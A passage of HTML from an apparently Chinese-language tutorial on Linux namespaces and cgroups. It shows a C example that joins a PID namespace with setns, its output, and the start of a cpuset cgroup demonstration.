id=\"crayon-5a6359ca744dc821204804-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">waitpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpid</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-52\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/* Setns */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">80</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-55\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sprintf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/proc/%d/ns/pid\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">child_pid</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">path</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">O_RDONLY</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-57\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-58\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"open error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">setns</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-60\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// setns并不会改变当前进程的命名空间, 而是会设置之后创建的子进程的命名空间</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-61\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"setns error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-62\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-63\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-64\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">npid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-65\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">npid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-66\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">perror</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"fork error\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">npid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-68\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"I am child process. My pid is %d  \\n\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getpid</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-69\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 新的子进程会被加入到第一个子进程的pid命名空间中, 所以其pid应该为2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-70\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">exit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-72\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744dc821204804-73\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744dc821204804-74\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0193 seconds] -->\r\n<p>运行结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744e4125198059\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo ./ns\r\nI'm child process and my pid is 1 \r\nI am child process. My pid is 1  \r\nI am child process. My pid is 2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744e4125198059-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744e4125198059-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744e4125198059-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744e4125198059-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744e4125198059-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">sudo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">ns</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744e4125198059-2\"><span class=\"crayon-i\">I</span>'<span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">process </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">my </span><span class=\"crayon-e\">pid </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744e4125198059-3\"><span class=\"crayon-i\">I</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">am </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">process</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">My </span><span class=\"crayon-e\">pid </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744e4125198059-4\"><span class=\"crayon-i\">I</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">am </span><span class=\"crayon-r\">child</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">process</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">My </span><span class=\"crayon-e\">pid </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p></p>\n<h1>控制组(Cgroups)<br>\n<span id=\"OSC_h1_4\"></span></h1>\n<h1></h1>\n<p>如果说命名空间是从命名和编号的角度进行隔离，而控制组则是将进程进行分组，并真正的将各组进程的计算资源进行限制、隔离。控制组是一种内核机制，它可以对进程进行分组、跟踪限制其使用的计算资源。对于每一类计算资源，控制组通过所谓的子系统(subsystem)来进行控制，现阶段已有的子系统包括：</p>\n<ul>\n<li>cpusets: 用来分配一组CPU给指定的cgroup，该cgroup中的进程只等被调度到该组CPU上去执行</li>\n<li>blkio : 限制cgroup的块IO</li>\n<li>cpuacct : 用来统计cgroup中的CPU使用</li>\n<li>devices : 用来黑白名单的方式控制cgroup可以创建和使用的设备节点</li>\n<li>freezer : 用来挂起指定的cgroup，或者唤醒挂起的cgroup</li>\n<li>hugetlb : 用来限制cgroup中hugetlb的使用</li>\n<li>memory : 用来跟踪限制内存及交换分区的使用</li>\n<li>net_cls : 用来根据发送端的cgroup来标记数据包，流量控制器(traffic controller)会根据这些标记来分配优先级</li>\n<li>net_prio : 用来设置cgroup的网络通信优先级</li>\n<li>cpu :用来设置cgroup中CPU的调度参数</li>\n<li>perf_event : 用来监控cgroup的CPU性能</li>\n</ul>\n<p>与命名空间不同，控制组并没有增加系统调用，而是实现了一个文件系统，通过文件及目录操作来管理控制组。下面通过一个例子来看一看cgroup是如何利用cpuset子系统来把进程绑定到指定的CPU上去执行的。</p>\n<p>1. 创建一个一直执行的shell脚本</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744e9965268338\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/bash\r\n\r\nx=0\r\n\r\nwhile [ True ];do\r\n    :\r\ndone;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744e9965268338-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744e9965268338-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744e9965268338-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744e9965268338-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744e9965268338-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744e9965268338-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744e9965268338-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744e9965268338-1\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744e9965268338-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359ca744e9965268338-3\"><span class=\"crayon-v\">x</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744e9965268338-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359ca744e9965268338-5\"><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">True</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744e9965268338-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6359ca744e9965268338-7\"><span class=\"crayon-v\">done</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>2. 在后台执行这个脚本</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744ee429099754\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# bash run.sh &amp;\r\n[1] 20553</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744ee429099754-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744ee429099754-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744ee429099754-1\"><span class=\"crayon-p\"># bash run.sh &amp;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744ee429099754-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20553</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>3. 查看该脚本在哪个CPU上运行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744f2558847602\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep\r\nroot     20553   3 bash run.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f2558847602-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f2558847602-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359ca744f2558847602-1\"><span class=\"crayon-p\"># ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359ca744f2558847602-2\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">20553</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bash </span><span class=\"crayon-v\">run</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n<p>可以看到PID为20553的进程运行在编号为3的CPU上，下面利用cgroups将其绑定到编号为2的CPU上去执行</p>\n<p>4. 挂载cgroups类型的文件系统到一个新创建的目录cgroups中</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359ca744f5414124892\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mkdir cgroups\r\n# mount -t cgroup -o cpuset cgroups ./cgroups/\r\n# ls cgroups/\r\ncgroup.clone_children   cpuset.memory_pressure_enabled\r\ncgroup.procs            cpuset.memory_spread_page\r\ncgroup.sane_behavior    cpuset.memory_spread_slab\r\ncpuset.cpu_exclusive    cpuset.mems\r\ncpuset.cpus             cpuset.sched_load_balance\r\ncpuset.effective_cpus   cpuset.sched_relax_domain_level\r\ncpuset.effective_mems   docker\r\ncpuset.mem_exclusive    tasks\r\ncpuset.mem_hardwall     notify_on_release\r\ncpuset.memory_migrate   release_agent\r\ncpuset.memory_pressure</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f5414124892-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f5414124892-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f5414124892-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f5414124892-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359ca744f5414124892-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359ca744f5414124892-11\">11</div><div class=\"crayon-num crayon-striped-num\" 